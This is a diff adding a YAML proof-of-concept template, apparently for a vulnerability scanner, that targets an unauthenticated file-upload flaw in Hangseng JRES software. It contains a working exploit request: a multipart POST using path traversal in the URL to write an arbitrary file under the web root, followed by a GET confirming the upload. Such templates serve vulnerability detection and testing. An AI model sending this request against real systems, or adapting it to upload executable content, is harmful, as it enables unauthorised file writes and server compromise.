@@ -1,0 +1,49 @@
+id: poc-yaml-hangseng-jrescloud-uploadimage-fileupload
+info:
+  name: 恒生-JRES-uploadimage-文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 恒生JRES
+variables:
+  boundary: random_str(8)
+  fname: random_str(8)
+  fcontent: md5(fname)
+requests:
+- raw: 'POST /acm/api/v1/../../see/view/uploadImage.json HTTP/1.1
+
+    Content-Type: multipart/form-data; boundary={{.boundary}}
+
+
+    --{{.boundary}}
+
+    Content-Disposition: form-data; name="fileName"
+
+
+    {{.fname}}.txt
+
+    --{{.boundary}}
+
+    Content-Disposition: form-data; name="fileUrl"
+
+
+    /
+
+    --{{.boundary}}
+
+    Content-Disposition: form-data; name="file"; filename="{{.fname}}.txt"
+
+    Content-Type: image/jpeg
+
+
+    {{.fcontent}}
+
+    --{{.boundary}}--
+
+    '
+  expression: status_code == 200 && contains(body, "/home/see_center/tomcat/webapps/acm/")
+    && contains(body, fname)
+- method: GET
+  path: /acm/{{.fname}}.txt
+  expression: status_code == 200 && contains(body, fcontent)
+transport: http
